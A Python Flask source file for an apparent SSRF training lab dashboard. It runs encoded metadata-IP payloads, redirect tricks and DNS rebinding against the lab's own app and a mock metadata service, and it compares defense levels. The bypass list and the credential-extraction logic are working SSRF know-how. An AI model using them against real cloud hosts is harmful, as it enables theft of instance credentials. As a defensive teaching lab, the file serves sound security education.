"""
SSRF Lab — Dashboard  (lab component, read-only + button-driven)
================================================================
⚠️  LAB-ONLY.  A small Flask backend that serves a self-contained SOC-style
dashboard and exposes JSON APIs that run the lab's OWN checks server-side by
REUSING the toolkit (ssrf_scan, imds_check) and the existing service endpoints.

- Auto-polling is read-only (lab status).
- Attacks run ONLY when you press a button (the /api/* routes), always against
  our own lab services, never anything external.
- The page is fully self-contained (inline CSS/JS, no CDN) so it works offline.
"""
import html as htmllib
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

from flask import Flask, Response, jsonify, request

# Reuse the toolkit (mounted read-only at /app/toolkit) — no duplicated logic.
sys.path.insert(0, "/app/toolkit")
from ssrf_scan import CREDS_PATH, classify, payloads, probe  # noqa: E402
import imds_check  # noqa: E402

app = Flask(__name__)

APP = "http://vulnerable-app:5000"
WAF = "http://waf:8080"
META = "http://169.254.169.254"
DNS = "http://dns-rebind.lab"
REBIND_TARGET = "http://rebind.lab" + CREDS_PATH
CREDS_URL = META + CREDS_PATH
METADATA_IP = "169.254.169.254"

# Friendly labels for the payload picker (keys match ssrf_scan.payloads()).
PAYLOAD_LABELS = {
    "dotted-decimal": "169.254.169.254  (literal IP)",
    "trailing-dot": "169.254.169.254.  (trailing dot)",
    "decimal-integer": "2852039166  (decimal)",
    "hex": "0xa9fea9fe  (hex)",
    "dotted-hex": "0xa9.0xfe.0xa9.0xfe  (dotted hex)",
    "dotted-octal": "0251.0376.0251.0376  (octal)",
    "ipv6-mapped": "[::ffff:169.254.169.254]  (IPv6-mapped)",
    "302-redirect": "preview-service.lab  (302 redirect)",
    "dns-innocent": "cdn-assets.lab  (innocent DNS name)",
    "legit-example": "example.com  (legitimate traffic)",
}

_BLOCK_RE = re.compile(r'<div class="blocked">.*?</b>\s*(.*?)</div>', re.S)
_ERR_RE = re.compile(r'<div class="error">.*?</b>\s*(.*?)</div>', re.S)
_PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)
_KEY_RE = re.compile(r'"AccessKeyId":\s*"([^"]+)"')

SERVICES = {
    "vulnerable-app": APP + "/",
    "waf": WAF + "/",
    "metadata": META + "/",
    "redirector": "http://preview-service.lab/health",
    "oob-listener": "http://oob-listener.lab/",
    "dns-rebind": DNS + "/state",
}


def _get(url, timeout=12):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _attack(base, level, url):
    """Run one SSRF attempt via the app and return verdict + detail."""
    query = urllib.parse.urlencode({"level": level, "url": url})
    status, body = _get(f"{base}/fetch?{query}")
    if status == 403:
        return {"verdict": "WAF-403", "detail": "blocked by the WAF (ModSecurity/CRS)"}
    if body is None:
        return {"verdict": "REQ-ERR", "detail": str(status or "no response")}
    verdict = classify(body)
    if verdict == "LOOT":
        m = _KEY_RE.search(htmllib.unescape((_PRE_RE.search(body) or [None, ""])[1]))
        return {"verdict": "LOOT", "detail": m.group(1) if m else "credentials returned"}
    if verdict == "BLOCKED":
        m = _BLOCK_RE.search(body)
        return {"verdict": "BLOCKED", "detail": htmllib.unescape(m.group(1).strip()) if m else ""}
    if verdict == "ERROR":
        # The app's own fetch failed (invalid/unreachable target) — NOT a defense.
        m = _ERR_RE.search(body)
        return {"verdict": "ERROR", "detail": htmllib.unescape(m.group(1).strip()) if m else ""}
    return {"verdict": verdict, "detail": ""}


@app.route("/api/status")
def api_status():
    return jsonify({name: bool(_get(url, timeout=4)[0]) for name, url in SERVICES.items()})


@app.route("/api/payloads")
def api_payloads():
    return jsonify([{"name": n, "label": PAYLOAD_LABELS.get(n, n)}
                    for n, _u in payloads(METADATA_IP)])


@app.route("/api/attack")
def api_attack():
    try:
        level = int(request.args.get("level", "0"))
    except ValueError:
        level = 0
    name = request.args.get("payload", "dotted-decimal")
    url = dict(payloads(METADATA_IP)).get(name, CREDS_URL)
    res = _attack(APP, level, url)
    res["payload"] = name
    res["level"] = level
    return jsonify(res)


@app.route("/api/matrix")
def api_matrix():
    rows = []
    for name, url in payloads(METADATA_IP):
        rows.append({"payload": name,
                     "cells": {f"L{lvl}": probe(APP, lvl, url) for lvl in (0, 1, 2, 3)}})
    return jsonify({"levels": ["L0", "L1", "L2", "L3"], "rows": rows})


@app.route("/api/waf")
def api_waf():
    rows = []
    for name, url in payloads(METADATA_IP):
        rows.append({"payload": name,
                     "direct": probe(APP, 0, url), "waf": probe(WAF, 0, url)})
    return jsonify({"rows": rows})


@app.route("/api/rebind")
def api_rebind():
    _get(f"{DNS}/reset", timeout=4)
    toctou = _attack(APP, 25, REBIND_TARGET)
    _s, log = _get(f"{DNS}/log", timeout=4)
    l3 = _attack(APP, 3, REBIND_TARGET)
    return jsonify({"toctou": toctou, "l3": l3,
                    "log": [x for x in (log or "").splitlines() if x.strip()]})


@app.route("/api/imds")
def api_imds():
    v1_status, _b, v1_leaked = imds_check.probe_v1(META)
    tok_status, _tok, v2_get, v2_leaked = imds_check.probe_v2(META)
    mode = "IMDSv1 (vulnerable)" if v1_leaked else (
        "IMDSv2 (enforced)" if v1_status in (401, 403) and v2_leaked else "unknown")
    return jsonify({"v1_status": v1_status, "v1_leaked": v1_leaked,
                    "v2_status": (v2_get[0] if v2_get else tok_status),
                    "v2_leaked": v2_leaked, "mode": mode})


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


PAGE = r"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>SSRF Lab — Control Center</title>
<style>
  :root{
    --bg:#0e141b; --panel:#151c26; --panel2:#101723; --line:#263140;
    --text:#c7d2de; --muted:#7a8799; --accent:#4f8fc0;
    --red:#d98a8a; --red-bg:#211a1d; --red-ln:#4a2a30;
    --green:#8fbfa3; --green-bg:#152019; --green-ln:#2b4535;
    --blue:#8fb4d0; --blue-bg:#141d27; --blue-ln:#2c3f52;
    --grey:#8a97a7; --grey-bg:#161d27; --grey-ln:#2a333f;
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--text);
    font-family:"Segoe UI",system-ui,-apple-system,sans-serif;font-size:14px;line-height:1.45}
  .wrap{max-width:1000px;margin:0 auto;padding:26px 20px 44px}
  header{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:14px}
  h1{margin:0;font-size:20px;letter-spacing:.2px;font-weight:650}
  .tag{font-size:11px;color:var(--muted);border:1px solid var(--line);border-radius:6px;padding:3px 8px}
  .lead{color:var(--muted);font-size:13px;margin:10px 0 0}
  h2{font-size:14px;font-weight:650;margin:0 0 3px}
  .desc{color:var(--muted);font-size:12px;margin:0 0 12px}
  .panel{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px;margin-top:16px}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
  @media(max-width:820px){.grid{grid-template-columns:1fr}}
  /* controls */
  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  label.f{font-size:12px;color:var(--muted)}
  select,button{font:inherit;font-size:13px;border-radius:8px;border:1px solid var(--line);
    background:var(--panel2);color:var(--text);padding:8px 11px}
  select{min-width:140px}
  button{cursor:pointer}button:hover{border-color:var(--accent);color:#fff}
  button.primary{border-color:var(--accent);background:#17222e}
  button:disabled{opacity:.5;cursor:default}
  .mini{font-size:11px;color:var(--muted)}
  /* topology */
  .flow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:4px 0 14px}
  .node{background:var(--panel2);border:1px solid var(--line);border-radius:9px;
    padding:8px 11px;text-align:center;min-width:86px}
  .node b{display:block;font-size:12.5px;font-weight:600}.node .st{font-size:10px;color:var(--muted)}
  .node.down{opacity:.45}.dot{display:inline-block;width:7px;height:7px;border-radius:50%;
    background:var(--grey);margin-right:4px}.node.up .dot{background:var(--green)}
  .seg{color:var(--muted);font-size:12px}
  .hero{min-width:132px;text-align:center;font-size:12px;color:var(--muted);
    border-top:2px dashed var(--line);padding-top:4px;transition:.25s}
  .hero.leaked{color:var(--red);border-color:var(--red-ln);font-weight:650}
  .hero.blocked{color:var(--green);border-color:var(--green-ln);font-weight:650}
  .hero.failed{color:var(--grey);border-color:var(--grey-ln);font-weight:650}
  /* outcome */
  .outcome{border-radius:10px;padding:12px 14px;margin-top:12px;border:1px solid var(--line);
    background:var(--panel2);font-size:13px}
  .outcome.leaked{background:var(--red-bg);border-color:var(--red-ln)}
  .outcome.blocked{background:var(--green-bg);border-color:var(--green-ln)}
  .outcome.failed{background:var(--grey-bg);border-color:var(--grey-ln)}
  .outcome .hd{font-weight:650;font-size:14px}
  .outcome.leaked .hd{color:var(--red)}.outcome.blocked .hd{color:var(--green)}
  .outcome.failed .hd{color:var(--grey)}
  .outcome .rs{color:var(--muted);margin-top:4px;font-size:12.5px;word-break:break-word}
  /* breakdown */
  .explain{background:var(--panel2);border:1px solid var(--line);border-left:3px solid var(--accent);
    border-radius:8px;padding:10px 12px;margin:12px 0;font-size:13px}
  .bd{display:flex;gap:18px;flex-wrap:wrap}.bd .col{flex:1 1 220px}
  .bd h4{margin:0 0 6px;font-size:12px;color:var(--muted);font-weight:600}
  /* pills */
  .pill{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
    border:1px solid var(--line);margin:2px 3px 2px 0;white-space:nowrap}
  .v-LOOT{color:var(--red);background:var(--red-bg);border-color:var(--red-ln)}
  .v-BLOCKED{color:var(--green);background:var(--green-bg);border-color:var(--green-ln)}
  .v-WAF-403{color:var(--green);background:var(--green-bg);border-color:var(--green-ln)}
  .v-FETCHED{color:var(--blue);background:var(--blue-bg);border-color:var(--blue-ln)}
  .v-ERROR,.v-REQ-ERR,.v-\.\.\.{color:var(--grey);background:var(--grey-bg);border-color:var(--grey-ln)}
  /* tables */
  table{border-collapse:collapse;width:100%;font-size:12.5px;margin-top:4px}
  th,td{border-bottom:1px solid var(--line);padding:6px 8px;text-align:center}
  th{color:var(--muted);font-weight:600}.pl{text-align:left;color:var(--text)}
  tbody tr:hover{background:#121a24}
  /* legend */
  .legend{display:flex;gap:14px;flex-wrap:wrap;margin-top:10px;font-size:11.5px;color:var(--muted)}
  .legend span b{color:var(--text);font-weight:600}
  .spin{font-size:11px;color:var(--accent)}
  code{background:var(--panel2);border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:12px}
</style></head><body><div class="wrap">

  <header>
    <h1>SSRF Lab · Control Center</h1>
    <span class="tag">lab-only · all credentials fake</span>
    <span class="tag" id="clock"></span>
  </header>
  <p class="lead">A controlled lab showing how Server-Side Request Forgery is exploited and, layer by layer,
     stopped. Read-only by default — attacks run only when you click, against the lab's own services.</p>

  <!-- ATTACK PATH -->
  <div class="panel">
    <h2>Attack path</h2>
    <p class="desc">Pick a payload and a defense level, then launch. The path to the metadata service lights up
       <span style="color:var(--red)">red when credentials leak</span> and
       <span style="color:var(--green)">green when the request is blocked</span>.</p>
    <div class="flow">
      <div class="node up"><b>Browser</b><span class="st">you</span></div>
      <div class="seg">──▶</div>
      <div class="node up" id="n-waf"><b>WAF</b><span class="st"><span class="dot"></span><span id="s-waf">?</span></span></div>
      <div class="seg">──▶</div>
      <div class="node up" id="n-app"><b>App L0–L3</b><span class="st"><span class="dot"></span><span id="s-app">?</span></span></div>
      <div class="hero" id="hero">SSRF</div>
      <div class="node up" id="n-meta"><b>Metadata</b><span class="st">169.254.169.254</span></div>
    </div>
    <div class="flow mini">
      <span>internal targets:</span>
      <span class="node" id="n-red"><b>redirector</b><span class="st"><span class="dot"></span><span id="s-redirector">?</span></span></span>
      <span class="node" id="n-oob"><b>oob-listener</b><span class="st"><span class="dot"></span><span id="s-oob-listener">?</span></span></span>
      <span class="node" id="n-dns"><b>dns-rebind</b><span class="st"><span class="dot"></span><span id="s-dns-rebind">?</span></span></span>
    </div>
    <div class="row" style="margin-top:6px">
      <label class="f">Payload</label><select id="payload"></select>
      <label class="f">Defense</label>
      <select id="lvl"><option value="0">L0 — none</option><option value="1">L1 — blocklist</option>
        <option value="2">L2 — parse+decode</option><option value="3">L3 — resolve-then-pin</option></select>
      <button class="primary" id="fire" onclick="launch()">Launch attack</button>
      <span id="amsg" class="spin"></span>
    </div>
    <div id="outcome" class="outcome"><span class="rs">No attack launched yet.</span></div>
  </div>

  <!-- PER-LEVEL BREAKDOWN -->
  <div class="panel">
    <h2>What does the selected level stop? <span id="bd-spin" class="spin">scanning lab…</span></h2>
    <p class="desc">This is the heart of the project: each layer stops a <i>different</i> set of attacks.
       Change the <b>Defense</b> selector above to compare.</p>
    <div class="explain" id="explain">—</div>
    <div class="bd">
      <div class="col"><h4>⚠ STILL LEAKS at this level</h4><div id="bd-leak"><span class="mini">—</span></div></div>
      <div class="col"><h4>✓ STOPPED at this level</h4><div id="bd-stop"><span class="mini">—</span></div></div>
    </div>
  </div>

  <div class="grid">
    <!-- MATRIX -->
    <div class="panel">
      <h2>Defense matrix · L0–L3</h2>
      <p class="desc">Every payload against every app level (live).</p>
      <div id="matrix"><span class="mini">scanning…</span></div>
    </div>
    <!-- WAF -->
    <div class="panel">
      <h2>WAF · with vs without <button onclick="waf()">Run</button> <span id="w-spin" class="spin"></span></h2>
      <p class="desc">Same payloads, direct (:8088) vs through the WAF (:8090), at L0.</p>
      <div id="waf"><span class="mini">Press Run.</span></div>
    </div>
    <!-- REBIND -->
    <div class="panel">
      <h2>DNS rebinding · TOCTOU <button onclick="rebind()">Run</button> <span id="r-spin" class="spin"></span></h2>
      <p class="desc">A TTL-0 flip beats a check-then-use level (L2.5); L3 pins the IP and holds.</p>
      <div id="rebind"><span class="mini">Press Run.</span></div>
    </div>
    <!-- IMDS -->
    <div class="panel">
      <h2>IMDS audit <button onclick="imds()">Run</button> <span id="i-spin" class="spin"></span></h2>
      <p class="desc">Does the metadata endpoint require a token (IMDSv2) or leak to a plain GET (IMDSv1)?</p>
      <div id="imds"><span class="mini">Press Run.</span></div>
    </div>
  </div>

  <div class="legend">
    <span><span class="pill v-LOOT">LOOT</span> = <b>credentials leaked</b></span>
    <span><span class="pill v-BLOCKED">BLOCKED</span> = stopped by a defense (filter)</span>
    <span><span class="pill v-WAF-403">WAF-403</span> = stopped by the WAF</span>
    <span><span class="pill v-FETCHED">FETCHED</span> = fetched, but not credentials</span>
    <span><span class="pill v-ERROR">ERROR</span> = <b>FAILED</b> technically — no defense involved</span>
  </div>

<script>
const $=id=>document.getElementById(id);
const pill=v=>`<span class="pill v-${v}">${v}</span>`;
async function j(u){const r=await fetch(u);return r.json();}
const EXPLAIN={
 "0":"No protection — every internal payload reaches the metadata service.",
 "1":"Naive string blocklist: stops the literal IP, but alternate encodings and DNS names slip through.",
 "2":"Parses & decodes IPs: stops every IP encoding, but an innocent DNS name or a 302 redirect still gets through.",
 "3":"Resolve-then-pin: validates the real connected IP and re-checks redirects — stops everything internal, while legitimate traffic still works."
};

function clock(){const d=new Date();$("clock").textContent=d.toLocaleTimeString();}
setInterval(clock,1000);clock();

async function status(){
 try{const s=await j('/api/status');const map={'vulnerable-app':'app','waf':'waf','metadata':'meta',
   'redirector':'red','oob-listener':'oob','dns-rebind':'dns'};
  for(const k in s){const e=$('s-'+k);if(e)e.textContent=s[k]?'up':'down';
   const n=$('n-'+map[k]);if(n)n.classList.toggle('down',!s[k]);}
 }catch(e){}
}

async function loadPayloads(){
 try{const p=await j('/api/payloads');
  $('payload').innerHTML=p.map(x=>`<option value="${x.name}">${x.label}</option>`).join('');
 }catch(e){}
}

let MATRIX=null;
async function loadMatrix(){
 try{const d=await j('/api/matrix');MATRIX=d;
  let h='<table><tr><th class="pl">payload</th>'+d.levels.map(l=>`<th>${l}</th>`).join('')+'</tr><tbody>';
  d.rows.forEach(r=>{h+=`<tr><td class="pl">${r.payload}</td>`+d.levels.map(l=>`<td>${pill(r.cells[l])}</td>`).join('')+'</tr>';});
  $('matrix').innerHTML=h+'</tbody></table>';
  $('bd-spin').textContent='';renderBreakdown();
 }catch(e){$('matrix').innerHTML='<span class="mini">error loading matrix</span>';$('bd-spin').textContent='';}
}

function renderBreakdown(){
 if(!MATRIX)return;const L='L'+$('lvl').value;
 $('explain').textContent=EXPLAIN[$('lvl').value];
 const leak=[],stop=[];
 MATRIX.rows.forEach(r=>{const v=r.cells[L];
   if(v==='LOOT')leak.push(r.payload);
   else if(v==='BLOCKED'||v==='WAF-403')stop.push(r.payload);});
 $('bd-leak').innerHTML=leak.length?leak.map(n=>`<span class="pill v-LOOT">${n}</span>`).join(''):'<span class="mini">none 🎉</span>';
 $('bd-stop').innerHTML=stop.length?stop.map(n=>`<span class="pill v-BLOCKED">${n}</span>`).join(''):'<span class="mini">none</span>';
}

async function launch(){
 const lvl=$('lvl').value,pl=$('payload').value;
 $('fire').disabled=true;$('amsg').textContent='running…';
 const hero=$('hero');hero.className='hero';
 try{const r=await j(`/api/attack?level=${lvl}&payload=${encodeURIComponent(pl)}`);
  const oc=$('outcome');
  if(r.verdict==='LOOT'){
    hero.className='hero leaked';hero.textContent='● LEAKED ●';
    oc.className='outcome leaked';
    oc.innerHTML=`<div class="hd">💀 CREDENTIALS LEAKED</div>
     <div class="rs">Payload <code>${pl}</code> at <b>L${lvl}</b> reached the metadata service.
     AccessKeyId = <code>${r.detail}</code></div>`;
  }else if(r.verdict==='BLOCKED'||r.verdict==='WAF-403'){
    hero.className='hero blocked';hero.textContent='✕ BLOCKED';
    oc.className='outcome blocked';
    const what=r.verdict==='WAF-403'?'the WAF (ModSecurity/CRS)':'defense level L'+lvl;
    oc.innerHTML=`<div class="hd">🛡️ BLOCKED BY A DEFENSE &nbsp;<span class="pill v-${r.verdict}">${r.verdict}</span></div>
     <div class="rs">Payload <code>${pl}</code> was deliberately refused by ${what}.
     ${r.detail?('Reason: '+r.detail):''}</div>`;
  }else if(r.verdict==='ERROR'||r.verdict==='REQ-ERR'){
    hero.className='hero failed';hero.textContent='… FAILED';
    oc.className='outcome failed';
    oc.innerHTML=`<div class="hd">⚙️ ATTACK FAILED (technical) &nbsp;<span class="pill v-ERROR">${r.verdict}</span></div>
     <div class="rs">Payload <code>${pl}</code> did not resolve or connect — the request failed on its own
     (invalid or unreachable target). <b>No defense was involved</b> at L${lvl}.
     ${r.detail?('Detail: '+r.detail):''}</div>`;
  }else{ // FETCHED — legitimate, non-credential response
    hero.className='hero';hero.textContent='↩ FETCHED';
    oc.className='outcome';
    oc.innerHTML=`<div class="hd">↩ FETCHED (not credentials)</div>
     <div class="rs">Payload <code>${pl}</code> returned a normal, non-credential response —
     legitimate traffic, neither an exploit nor a block.</div>`;
  }
 }catch(e){$('outcome').className='outcome';$('outcome').innerHTML='<span class="rs">request error</span>';}
 $('fire').disabled=false;$('amsg').textContent='';
}

async function waf(){
 $('w-spin').textContent='scanning…';
 try{const d=await j('/api/waf');let h='<table><tr><th class="pl">payload</th><th>no-WAF</th><th>via-WAF</th></tr><tbody>';
  d.rows.forEach(r=>{h+=`<tr><td class="pl">${r.payload}</td><td>${pill(r.direct)}</td><td>${pill(r.waf)}</td></tr>`;});
  $('waf').innerHTML=h+'</tbody></table>';}catch(e){$('waf').innerHTML='<span class="mini">error</span>';}
 $('w-spin').textContent='';
}

async function rebind(){
 $('r-spin').textContent='running…';
 try{const d=await j('/api/rebind');
  const safe=(d.log[0]||'').split('-> ')[1]||'safe',intl=(d.log[1]||'').split('-> ')[1]||'internal';
  $('rebind').innerHTML=`<div class="mini" style="margin-bottom:8px">query #1 <code>${safe}</code> ✓ validated →
    query #2 <code>${intl}</code> 🔁 flips to internal</div>
   <table><tr><th class="pl">level</th><th>result</th></tr><tbody>
   <tr><td class="pl">L2.5 check-then-use</td><td>${pill(d.toctou.verdict)}</td></tr>
   <tr><td class="pl">L3 resolve-then-pin</td><td>${pill(d.l3.verdict)}</td></tr></tbody></table>`;
 }catch(e){$('rebind').innerHTML='<span class="mini">error</span>';}
 $('r-spin').textContent='';
}

async function imds(){
 $('i-spin').textContent='checking…';
 try{const d=await j('/api/imds');
  $('imds').innerHTML=`<table><tr><th class="pl">probe</th><th>status</th><th>result</th></tr><tbody>
   <tr><td class="pl">IMDSv1 — plain GET</td><td>${d.v1_status}</td><td>${pill(d.v1_leaked?'LOOT':'BLOCKED')}</td></tr>
   <tr><td class="pl">IMDSv2 — PUT-token flow</td><td>${d.v2_status}</td><td>${pill(d.v2_leaked?'FETCHED':'BLOCKED')}</td></tr>
   </tbody></table><p class="mini" style="margin-top:8px">Enforced mode: <b>${d.mode}</b></p>`;
 }catch(e){$('imds').innerHTML='<span class="mini">error</span>';}
 $('i-spin').textContent='';
}

$('lvl').addEventListener('change',renderBreakdown);
status();setInterval(status,5000);loadPayloads();loadMatrix();
</script></div></body></html>"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
